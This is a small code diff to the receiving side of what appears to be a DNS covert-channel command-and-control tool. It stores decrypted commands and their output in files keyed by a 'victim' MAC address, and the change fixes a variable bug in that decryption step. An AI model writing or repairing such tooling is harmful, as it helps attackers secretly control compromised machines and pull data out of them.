@@ -134,7 +134,7 @@ class DataReceiver():
         with open(self.rel_path + str(victim_mac) + '/output/' + timestamp + '.txt', 'w') as f:
             dnsrr_layer = pkt.getlayer(DNSRR)
             command = dnsrr_layer.rrname[:-1]
-            f.write(Encrypter(line, SECRET).decrypt() + '\n') # Command associated with output
+            f.write(Encrypter(command, SECRET).decrypt() + '\n') # Command associated with output
             f.write(dnsrr_layer.rdata)
 
     def _handle_data_pkts(self, pkt, dns_layer, dnsqr_layer, filename, key, victim_mac):
